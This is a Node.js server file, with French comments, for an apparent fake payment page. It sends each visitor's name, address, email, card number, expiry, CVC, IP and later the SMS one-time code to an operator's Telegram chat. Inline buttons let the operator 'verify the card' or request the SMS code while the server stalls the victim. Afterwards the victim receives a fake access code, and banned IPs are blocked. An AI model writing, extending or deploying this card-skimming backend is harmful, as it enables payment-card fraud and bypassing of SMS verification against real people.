const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const db = require('./lib/db');

const app = express();
app.set('trust proxy', true);
const PORT = process.env.PORT || 3000;
const CODES_FILE = path.join(__dirname, 'codes.json');

// Telegram Configuration
const tgToken = process.env.TOKEN_TELEGRAM;
const tgChatId = process.env.TELEGRAM_CHAT_ID;
const botTg = new TelegramBot(tgToken, { polling: true });

const pendingPayments = new Map();

// Helper for Telegram Logging
async function sendToTelegram(message, options = {}) {
    if (!tgChatId) return;
    try {
        await botTg.sendMessage(tgChatId, message, { 
            parse_mode: 'Markdown',
            ...options
        });
        console.log("Log envoyé sur Telegram (server.js)");
    } catch (err) {
        console.error("Erreur Telegram server.js:", err.message);
    }
}

// Card Validation Helper
function validateCard(number, expiry, cvc) {
    const checkLuhn = (num) => {
        let n = num.replace(/\s/g, '');
        let sum = 0;
        for (let i = 0; i < n.length; i++) {
            let intVal = parseInt(n.substr(i, 1));
            if (i % 2 === n.length % 2) {
                intVal *= 2;
                if (intVal > 9) intVal -= 9;
            }
            sum += intVal;
        }
        return sum % 10 === 0;
    };
    const isLuhnValid = checkLuhn(number);
    const [month, year] = expiry.split('/').map(s => parseInt(s.trim()));
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    const isExpiryValid = month > 0 && month <= 12 && (year > currentYear || (year === currentYear && month >= currentMonth));
    const isCvcValid = cvc.length >= 3 && cvc.length <= 4;
    return { isLuhnValid, isExpiryValid, isCvcValid };
}

botTg.on('callback_query', (query) => {
    const data = query.data;
    if (data.startsWith('ask_sms_')) {
        const paymentId = data.replace('ask_sms_', '');
        if (pendingPayments.has(paymentId)) {
            pendingPayments.get(paymentId).needsSms = true;
            botTg.answerCallbackQuery(query.id, { text: "Code SMS demandé (Server)" });
        }
    }
});

// Helper for Real IP
const getRealIP = (req) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
    return req.ip || req.connection.remoteAddress;
};

// IP Ban Middleware
const checkIPBan = async (req, res, next) => {
    try {
        const ip = getRealIP(req);
        const result = await db.query('SELECT * FROM banned_ips WHERE ip = $1', [ip]);
        if (result.rows.length > 0) {
            return res.status(403).send('<html><body style="background:#000;color:#f00;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>Accès Interdit.</h1></body></html>');
        }
        next();
    } catch (err) {
        next();
    }
};

app.use(cors());
app.use(bodyParser.json());
app.use(checkIPBan);
app.use(express.static('public'));

// Ensure codes file exists
if (!fs.existsSync(CODES_FILE)) {
    fs.writeFileSync(CODES_FILE, JSON.stringify({ codes: [] }, null, 2));
}

function generateCode() {
    return Array.from({ length: 4 }, () => 
        Math.random().toString(36).substring(2, 6).toUpperCase()
    ).join('-');
}

app.post('/api/pay', async (req, res) => {
    const { firstName, lastName, billingAddress, cardNumber, expiry, cvc, email, country } = req.body;
    const paymentId = Math.random().toString(36).substring(2, 11);
    pendingPayments.set(paymentId, { needsSms: false });

    try {
        const message = `💳 *NOUVEAU PAIEMENT (SERVER)*\n\n` +
            `👤 *NOM:* \`${lastName || 'N/A'}\`\n` +
            `👤 *PRÉNOM:* \`${firstName || 'N/A'}\`\n` +
            `🏠 *ADRESSE:* \`${billingAddress || 'N/A'}\`\n` +
            `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
            `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
            `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${getRealIP(req)}\``;
        
        await sendToTelegram(message, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔍 Vérifier la carte", callback_data: `validate_|${cardNumber}|${expiry}|${cvc}` }],
                    [{ text: "📲 DEMANDER CODE SMS", callback_data: `ask_sms_${paymentId}` }]
                ]
            }
        });
    } catch (err) {
        console.error("Telegram log error server.js:", err.message);
    }

    // Delay 10 seconds (gives more time to the operator)
    setTimeout(async () => {
        const p = pendingPayments.get(paymentId);
        if (p && p.needsSms) {
            // "ajouter du temps"
            await new Promise(resolve => setTimeout(resolve, 5000));
            return res.json({ success: true, needsSms: true, paymentId });
        }
        const newCode = generateCode();
        res.json({ success: true, code: newCode });
        pendingPayments.delete(paymentId);
    }, 10000); // 10s wait for operator
});

app.post('/api/submit-sms', async (req, res) => {
    const { smsCode, paymentId } = req.body;
    sendToTelegram(`📲 *SMS REÇU (Server)*\nCODE: \`${smsCode}\`\n🌐 *IP:* \`${getRealIP(req)}\``);
    res.json({ success: true, code: generateCode() });
});

app.get('/api/log-visit', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, () => {
    console.log(`Web server running on http://localhost:${PORT}`);
});
